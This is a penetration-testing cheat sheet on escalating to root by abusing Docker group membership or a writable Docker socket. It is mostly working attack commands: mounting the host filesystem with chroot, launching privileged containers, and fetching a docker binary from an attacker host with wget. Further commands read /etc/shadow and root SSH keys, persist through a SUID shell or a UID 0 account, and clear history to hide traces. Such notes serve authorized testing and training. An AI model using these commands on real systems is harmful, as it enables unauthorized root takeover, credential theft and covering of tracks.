### 1. Technique Name:

Docker – Privilege Escalation via Docker Group / Socket Abuse
### 2. Summary:

Docker is a containerization platform that allows applications to run in isolated environments. If a low-privileged user is a member of the `docker` group or can interact with the Docker socket (`/var/run/docker.sock`), they can escalate privileges to root. This is because Docker containers can be launched with host-level access and mounted directories, including the full root filesystem.

Multiple escalation vectors exist:

- Launching a container with the host’s `/` directory mounted and chrooting into it.    
- Abusing shared volumes to extract sensitive files like SSH private keys.
- Using writable Docker sockets to spin up privileged containers.
### 3. Conditions / Requirements:

- User is in the `docker` group **OR**    
- Can write to the Docker socket (`/var/run/docker.sock`)
- Docker is installed and the daemon is running
- Ability to run Docker commands or upload a Docker client binary
- Base images (e.g., `ubuntu`) must be locally present or downloadable
### 4. Enumeration Steps:
#### A. Check group membership:

```bash
id
# Look for 'docker' in groups
```
#### B. Check socket permissions:

```bash
ls -l /var/run/docker.sock
```
#### C. List Docker images:

```bash
docker image ls
```
#### D. List running containers:

```bash
docker ps
```
#### E. Identify mount points (optional):

```bash
docker inspect <container_id>
```
### 5. Exploitation Steps:
#### A. Full Host FS Mount + chroot:

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Now you're in the host's root filesystem as root.
#### B. Abuse writable socket (manual docker binary if needed):

```bash
wget https://<yourhost>:443/docker -O docker
chmod +x docker
/tmp/docker -H unix:///app/docker.sock run -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock exec -it <new_container_id> /bin/bash
cd /hostsystem/root
cat .ssh/id_rsa
```
#### C. Docker Volume Leak Enumeration:

If volumes are shared, you can inspect directories from within a container:

```bash
cd /hostsystem/home/<target_user>/
cat .ssh/id_rsa
```

Then use the key to SSH back into the host:

```bash
ssh <user>@<host IP> -i key.priv
```
#### D. Docker Group Direct Shell (if in group):

```bash
docker run -it --rm --privileged -v /:/mnt ubuntu chroot /mnt bash
```
### 6. Post-Exploitation Tips:

- Extract sensitive files:    
    - `/etc/shadow`, `/root/.ssh/id_rsa`, `config.php`, `.bash_history`
- Maintain access:
    - Add user to `/etc/passwd` with UID 0        
    - Drop a SUID shell:

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```

- Clean up logs and container:

```bash
history -c
docker ps -a
docker rm <container_id>
```

### 7. Example / Notes:

- If Docker is not in PATH or CLI is missing, upload statically compiled `docker` binary
- Common mounted socket path: `/var/run/docker.sock`
- You can enumerate Docker daemon remotely if it's exposed over TCP:

```bash
docker -H tcp://<target>:2375 ps
```

- Docker Compose or Desktop are GUI-based frontends, but underlying abuse remains the same
- Writable Docker socket = root access  
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Docker #Groups